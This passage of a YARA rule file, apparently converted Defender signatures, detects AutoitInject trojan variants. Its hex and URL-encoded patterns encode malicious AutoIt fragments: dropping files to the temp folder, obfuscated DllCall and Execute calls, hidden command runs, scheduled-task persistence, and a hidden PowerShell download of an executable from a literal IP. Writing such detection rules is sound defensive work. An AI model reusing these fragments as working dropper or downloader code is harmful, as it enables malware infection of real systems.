        $x_2_6 = {44 6c 22 20 26 20 22 6c 43 61 6c 6c 22 20 2c 20 [0-47] 20 28 20 22}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_3_*) and 2 of ($x_2_*))) or
            ((1 of ($x_5_*) and 1 of ($x_3_*) and 1 of ($x_2_*))) or
            ((1 of ($x_5_*) and 2 of ($x_3_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_ARUA_2147941902_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ARUA!MTB"
        threat_id = "2147941902"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "14"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-20] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-20] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-20] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-20] 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_2_3 = {28 00 20 00 22 00 46 00 69 00 6c 00 65 00 22 00 20 00 26 00 20 00 22 00 52 00 65 00 61 00 64 00 22 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 28 00 20 00 22 00 46 00 69 00 6c 00 65 00 4f 00 22 00 20 00 26 00 20 00 22 00 70 00 65 00 6e 00 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-20] 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {28 20 22 46 69 6c 65 22 20 26 20 22 52 65 61 64 22 20 2c 20 24 [0-20] 20 28 20 22 46 69 6c 65 4f 22 20 26 20 22 70 65 6e 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-20] 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_5 = {28 00 20 00 22 00 44 00 6c 00 6c 00 53 00 74 00 72 00 75 00 63 00 74 00 22 00 20 00 26 00 20 00 22 00 43 00 72 00 65 00 61 00 74 00 65 00 22 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 31 00 30 00 33 00 20 00 31 00 32 00 36 00 20 00 31 00 32 00 31 00 20 00 31 00 30 00 36 00 20 00 39 00 36 00 22 00 20 00 29 00 20 00 26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-20] 20 00 29 00 20 00 26 00 20 00 [0-20] 20 00 28 00 20 00 22 00 39 00 38 00 22 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_6 = {28 20 22 44 6c 6c 53 74 72 75 63 74 22 20 26 20 22 43 72 65 61 74 65 22 20 2c 20 [0-20] 20 28 20 22 31 30 33 20 31 32 36 20 31 32 31 20 31 30 36 20 39 36 22 20 29 20 26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-20] 20 29 20 26 20 [0-20] 20 28 20 22 39 38 22 20 29 20 29}  //weight: 2, accuracy: Low
        $x_4_7 = {28 00 20 00 22 00 44 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 43 00 61 00 6c 00 6c 00 22 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 31 00 31 00 32 00 20 00 31 00 30 00 36 00 20 00 31 00 31 00 39 00 20 00 31 00 31 00 35 00 20 00 31 00 30 00 36 00 20 00 31 00 31 00 33 00 20 00 35 00 36 00 20 00 35 00 35 00 20 00 35 00 31 00 20 00 31 00 30 00 35 00 20 00 31 00 31 00 33 00 20 00 31 00 31 00 33 00 22 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_8 = {28 20 22 44 6c 22 20 26 20 22 6c 43 61 6c 6c 22 20 2c 20 [0-20] 20 28 20 22 31 31 32 20 31 30 36 20 31 31 39 20 31 31 35 20 31 30 36 20 31 31 33 20 35 36 20 35 35 20 35 31 20 31 30 35 20 31 31 33 20 31 31 33 22 20 29}  //weight: 4, accuracy: Low
        $x_4_9 = {28 00 20 00 22 00 44 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 43 00 61 00 6c 00 6c 00 22 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 31 00 32 00 32 00 20 00 31 00 32 00 30 00 20 00 31 00 30 00 36 00 20 00 31 00 31 00 39 00 20 00 35 00 36 00 20 00 35 00 35 00 20 00 35 00 31 00 20 00 31 00 30 00 35 00 20 00 31 00 31 00 33 00 20 00 31 00 31 00 33 00 22 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_10 = {28 20 22 44 6c 22 20 26 20 22 6c 43 61 6c 6c 22 20 2c 20 [0-20] 20 28 20 22 31 32 32 20 31 32 30 20 31 30 36 20 31 31 39 20 35 36 20 35 35 20 35 31 20 31 30 35 20 31 31 33 20 31 31 33 22 20 29}  //weight: 4, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 5 of ($x_2_*))) or
            ((2 of ($x_4_*) and 3 of ($x_2_*))) or
            ((3 of ($x_4_*) and 1 of ($x_2_*))) or
            ((4 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_BAB_2147942207_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BAB!MTB"
        threat_id = "2147942207"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 44 00 4c 00 4c 00 53 00 54 00 52 00 55 00 43 00 54 00 43 00 52 00 45 00 41 00 54 00 45 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 31 00 30 00 32 00 20 00 31 00 32 00 35 00 20 00 31 00 32 00 30 00 20 00 31 00 30 00 35 00 20 00 39 00 35 00 22 00 20 00 29 00 20 00 26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-20] 20 00 29 00 20 00 26 00 20 00 [0-32] 20 00 28 00 20 00 22 00 39 00 37 00 22 00 20 00 29 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 44 4c 4c 53 54 52 55 43 54 43 52 45 41 54 45 20 28 20 [0-20] 20 28 20 22 31 30 32 20 31 32 35 20 31 32 30 20 31 30 35 20 39 35 22 20 29 20 26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-20] 20 29 20 26 20 [0-32] 20 28 20 22 39 37 22 20 29 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 44 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 53 00 74 00 72 00 75 00 22 00 20 00 26 00 20 00 22 00 63 00 74 00 22 00 20 00 26 00 20 00 22 00 47 00 65 00 22 00 20 00 26 00 20 00 22 00 74 00 50 00 74 00 22 00 20 00 26 00 20 00 22 00 72 00 22 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 43 41 4c 4c 20 28 20 22 44 6c 22 20 26 20 22 6c 22 20 26 20 22 53 74 72 75 22 20 26 20 22 63 74 22 20 26 20 22 47 65 22 20 26 20 22 74 50 74 22 20 26 20 22 72 22 20 2c 20 24 [0-20] 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-64] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-64] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-64] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-64] 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 44 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 61 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 31 00 31 00 31 00 20 00 31 00 30 00 35 00 20 00 31 00 31 00 38 00 20 00 31 00 31 00 34 00 20 00 31 00 30 00 35 00 20 00 31 00 31 00 32 00 20 00 35 00 35 00 20 00 35 00 34 00 20 00 35 00 30 00 20 00 31 00 30 00 34 00 20 00 31 00 31 00 32 00 20 00 31 00 31 00 32 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {43 41 4c 4c 20 28 20 22 44 22 20 26 20 22 6c 22 20 26 20 22 6c 22 20 26 20 22 43 22 20 26 20 22 61 22 20 26 20 22 6c 22 20 26 20 22 6c 22 20 2c 20 [0-20] 20 28 20 22 31 31 31 20 31 30 35 20 31 31 38 20 31 31 34 20 31 30 35 20 31 31 32 20 35 35 20 35 34 20 35 30 20 31 30 34 20 31 31 32 20 31 31 32 22 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 44 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 61 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 31 00 32 00 31 00 20 00 31 00 31 00 39 00 20 00 31 00 30 00 35 00 20 00 31 00 31 00 38 00 20 00 35 00 35 00 20 00 35 00 34 00 20 00 35 00 30 00 20 00 31 00 30 00 34 00 20 00 31 00 31 00 32 00 20 00 31 00 31 00 32 00 22 00 20 00 29 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 31 00 31 00 36 00 20 00 31 00 32 00 30 00 20 00 31 00 31 00 38 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {43 41 4c 4c 20 28 20 22 44 22 20 26 20 22 6c 22 20 26 20 22 6c 22 20 26 20 22 43 22 20 26 20 22 61 22 20 26 20 22 6c 22 20 26 20 22 6c 22 20 2c 20 [0-20] 20 28 20 22 31 32 31 20 31 31 39 20 31 30 35 20 31 31 38 20 35 35 20 35 34 20 35 30 20 31 30 34 20 31 31 32 20 31 31 32 22 20 29 20 2c 20 [0-20] 20 28 20 22 31 31 36 20 31 32 30 20 31 31 38 22 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win32_AutoitInject_BAA_2147944116_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BAA!MTB"
        threat_id = "2147944116"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-20] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-20] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-20] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-20] 22 20 2c 20 31 20 29}  //weight: 2, accuracy: Low
        $x_1_3 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 61 00 6c 00 6c 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 45 58 45 43 55 54 45 20 28 20 22 43 22 20 26 20 22 61 6c 6c 22 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 24 00 [0-20] 20 00 28 00 20 00 22 00 46 00 69 00 6c 00 65 00 22 00 20 00 26 00 20 00 22 00 52 00 65 00 22 00 20 00 26 00 20 00 22 00 61 00 64 00 22 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 28 00 20 00 22 00 46 00 69 00 6c 00 22 00 20 00 26 00 20 00 22 00 65 00 4f 00 22 00 20 00 26 00 20 00 22 00 70 00 65 00 6e 00 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-20] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 24 [0-20] 20 28 20 22 46 69 6c 65 22 20 26 20 22 52 65 22 20 26 20 22 61 64 22 20 2c 20 24 [0-20] 20 28 20 22 46 69 6c 22 20 26 20 22 65 4f 22 20 26 20 22 70 65 6e 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-20] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 24 00 [0-20] 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 53 00 22 00 20 00 26 00 20 00 22 00 74 00 72 00 75 00 63 00 74 00 22 00 20 00 26 00 20 00 22 00 43 00 72 00 65 00 61 00 74 00 65 00 22 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 31 00 30 00 33 00 20 00 31 00 32 00 36 00 20 00 31 00 32 00 31 00 20 00 31 00 30 00 36 00 20 00 39 00 36 00 22 00 20 00 29 00 20 00 26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-20] 20 00 29 00 20 00 26 00 20 00 [0-20] 20 00 28 00 20 00 22 00 39 00 38 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 24 [0-20] 20 28 20 22 44 6c 6c 53 22 20 26 20 22 74 72 75 63 74 22 20 26 20 22 43 72 65 61 74 65 22 20 2c 20 [0-20] 20 28 20 22 31 30 33 20 31 32 36 20 31 32 31 20 31 30 36 20 39 36 22 20 29 20 26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-20] 20 29 20 26 20 [0-20] 20 28 20 22 39 38 22 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_1_*))) or
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_BAC_2147944117_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.BAC!MTB"
        threat_id = "2147944117"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 00 49 00 4c 00 45 00 49 00 4e 00 53 00 54 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-21] 22 00 20 00 2c 00 20 00 40 00 54 00 45 00 4d 00 50 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 [0-20] 22 00 20 00 2c 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {46 49 4c 45 49 4e 53 54 41 4c 4c 20 28 20 22 [0-21] 22 20 2c 20 40 54 45 4d 50 44 49 52 20 26 20 22 5c [0-20] 22 20 2c 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 [0-20] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 45 58 45 43 55 54 45 20 28 20 22 [0-20] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 53 00 74 00 72 00 75 00 63 00 74 00 47 00 65 00 74 00 44 00 61 00 74 00 61 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 53 74 72 75 63 74 47 65 74 44 61 74 61 22 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 53 00 74 00 72 00 75 00 63 00 74 00 43 00 72 00 65 00 61 00 74 00 65 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 53 74 72 75 63 74 43 72 65 61 74 65 22 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 43 00 22 00 20 00 26 00 20 00 22 00 61 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_10 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 45 58 45 43 55 54 45 20 28 20 22 44 22 20 26 20 22 6c 22 20 26 20 22 6c 22 20 26 20 22 43 22 20 26 20 22 61 22 20 26 20 22 6c 22 20 26 20 22 6c 22 20 29}  //weight: 1, accuracy: Low
        $x_1_11 = {47 00 4c 00 4f 00 42 00 41 00 4c 00 20 00 24 00 [0-20] 20 00 3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 42 00 69 00 6e 00 61 00 72 00 79 00 54 00 6f 00 53 00 74 00 72 00 69 00 6e 00 67 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_12 = {47 4c 4f 42 41 4c 20 24 [0-20] 20 3d 20 45 58 45 43 55 54 45 20 28 20 22 42 69 6e 61 72 79 54 6f 53 74 72 69 6e 67 22 20 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Trojan_Win32_AutoitInject_PGA_2147944199_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.PGA!MTB"
        threat_id = "2147944199"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "%50%6f%77%65%72%53%68%65%6c%6c%20%2d%57%69%6e%64%6f%77%53%74%79%6c%65%20%48%69%64%64%65%6e%20%24%64%3d%24%65%6e%76%" ascii //weight: 1
        $x_1_2 = "%31%38%35%2e%31%35%36%2e%37%32%2e%32%2f%74%65%73%74%6d%69%6e%65%2f%72%61%6e%64%6f%6d%2e%65%78%65" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_HNU_2147944436_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.HNU!MTB"
        threat_id = "2147944436"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "260"
        strings_accuracy = "Low"
    strings:
        $x_50_1 = " x -aoa -bso0 -bsp1" ascii //weight: 50
        $x_10_2 = {52 00 55 00 4e 00 20 00 28 00 20 00 22 00 22 00 22 00 22 00 20 00 26 00 20 00 24 00 [0-22] 20 00 26 00 20 00 22 00 22 00 22 00 22 00 20 00 2c 00 20 00 22 00 22 00 20 00 2c 00 20 00 40 00 53 00 57 00 5f 00 48 00 49 00 44 00 45 00 20 00 29 00}  //weight: 10, accuracy: Low
        $x_10_3 = {52 55 4e 20 28 20 22 22 22 22 20 26 20 24 [0-22] 20 26 20 22 22 22 22 20 2c 20 22 22 20 2c 20 40 53 57 5f 48 49 44 45 20 29}  //weight: 10, accuracy: Low
        $x_100_4 = {3d 00 20 00 22 00 73 00 63 00 68 00 74 00 61 00 73 00 6b 00 73 00 20 00 2f 00 63 00 72 00 65 00 61 00 74 00 65 00 20 00 2f 00 74 00 6e 00 20 00 22 00 22 00 22 00 20 00 26 00 20 00 24 00 [0-22] 20 00 26 00 20 00 22 00 22 00 22 00 20 00 2f 00 74 00 72 00 20 00 22 00 22 00 22 00 20 00 26 00 20 00 24 00 [0-22] 20 00 26 00 20 00 22 00 5c 00 [0-22] 2e 00 65 00 78 00 65 00 22 00 20 00 26 00 20 00 22 00 22 00 22 00 20 00 2f 00 73 00 63 00 20 00 6d 00 69 00 6e 00 75 00 74 00 65 00 20 00 2f 00 6d 00 6f 00 20 00 31 00 30 00 20 00 2f 00 72 00 75 00 20 00 22 00 22 00 22 00 20 00 26 00 20 00 40 00 55 00 53 00 45 00 52 00 4e 00 41 00 4d 00 45 00 20 00 26 00 20 00 22 00 22 00 22 00 20 00 2f 00 66 00}  //weight: 100, accuracy: Low
        $x_100_5 = {3d 20 22 73 63 68 74 61 73 6b 73 20 2f 63 72 65 61 74 65 20 2f 74 6e 20 22 22 22 20 26 20 24 [0-22] 20 26 20 22 22 22 20 2f 74 72 20 22 22 22 20 26 20 24 [0-22] 20 26 20 22 5c [0-22] 2e 65 78 65 22 20 26 20 22 22 22 20 2f 73 63 20 6d 69 6e 75 74 65 20 2f 6d 6f 20 31 30 20 2f 72 75 20 22 22 22 20 26 20 40 55 53 45 52 4e 41 4d 45 20 26 20 22 22 22 20 2f 66}  //weight: 100, accuracy: Low
        $x_100_6 = {52 00 55 00 4e 00 20 00 28 00 20 00 40 00 43 00 4f 00 4d 00 53 00 50 00 45 00 43 00 20 00 26 00 20 00 22 00 20 00 2f 00 63 00 20 00 22 00 20 00 26 00 20 00 24 00 [0-22] 20 00 2c 00 20 00 22 00 22 00 20 00 2c 00 20 00 40 00 53 00 57 00 5f 00 48 00 49 00 44 00 45 00 20 00 29 00}  //weight: 100, accuracy: Low
        $x_100_7 = {52 55 4e 20 28 20 40 43 4f 4d 53 50 45 43 20 26 20 22 20 2f 63 20 22 20 26 20 24 [0-22] 20 2c 20 22 22 20 2c 20 40 53 57 5f 48 49 44 45 20 29}  //weight: 100, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_100_*) and 1 of ($x_50_*) and 1 of ($x_10_*))) or
            ((3 of ($x_100_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_ACYA_2147945143_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ACYA!MTB"
        threat_id = "2147945143"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "20"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 53 00 74 00 72 00 69 00 6e 00 67 00 4c 00 65 00 6e 00 22 00 20 00 2c 00 20 00 24 00 [0-30] 20 00}  //weight: 2, accuracy: Low
        $x_2_2 = {43 41 4c 4c 20 28 20 22 53 74 72 69 6e 67 4c 65 6e 22 20 2c 20 24 [0-30] 20}  //weight: 2, accuracy: Low
        $x_2_3 = {43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 41 00 73 00 63 00 22 00 20 00 2c 00 20 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 53 00 74 00 72 00 69 00 6e 00 67 00 4d 00 69 00 64 00 22 00 20 00 2c 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 31 00 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_4 = {43 41 4c 4c 20 28 20 22 41 73 63 22 20 2c 20 43 41 4c 4c 20 28 20 22 53 74 72 69 6e 67 4d 69 64 22 20 2c 20 24 [0-30] 20 2c 20 24 [0-30] 20 2c 20 31 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_5 = {43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 43 00 68 00 72 00 22 00 20 00 2c 00 20 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 42 00 69 00 74 00 58 00 4f 00 52 00 22 00 20 00 2c 00 20 00 24 00 [0-30] 20 00 2c 00 20 00 24 00 [0-30] 20 00 29 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_6 = {43 41 4c 4c 20 28 20 22 43 68 72 22 20 2c 20 43 41 4c 4c 20 28 20 22 42 69 74 58 4f 52 22 20 2c 20 24 [0-30] 20 2c 20 24 [0-30] 20 29 20 29}  //weight: 2, accuracy: Low
        $x_2_7 = {43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 4d 00 6f 00 64 00 22 00 20 00 2c 00 20 00 24 00 [0-30] 20 00 2b 00 20 00 31 00 33 00 20 00 2c 00 20 00 32 00 35 00 36 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_8 = {43 41 4c 4c 20 28 20 22 4d 6f 64 22 20 2c 20 24 [0-30] 20 2b 20 31 33 20 2c 20 32 35 36 20 29}  //weight: 2, accuracy: Low
        $x_4_9 = {44 00 4c 00 4c 00 53 00 54 00 52 00 55 00 43 00 54 00 43 00 52 00 45 00 41 00 54 00 45 00 20 00 28 00 20 00 [0-30] 20 00 28 00 20 00 22 00 55 00 3d 00 25 00 3b 00 30 00 22 00 20 00 29 00 20 00 26 00 20 00 42 00 49 00 4e 00 41 00 52 00 59 00 4c 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-30] 20 00 29 00 20 00 26 00 20 00 [0-30] 20 00 28 00 20 00 22 00 6a 00 22 00 20 00 29 00 20 00 29 00}  //weight: 4, accuracy: Low
        $x_4_10 = {44 4c 4c 53 54 52 55 43 54 43 52 45 41 54 45 20 28 20 [0-30] 20 28 20 22 55 3d 25 3b 30 22 20 29 20 26 20 42 49 4e 41 52 59 4c 45 4e 20 28 20 24 [0-30] 20 29 20 26 20 [0-30] 20 28 20 22 6a 22 20 29 20 29}  //weight: 4, accuracy: Low
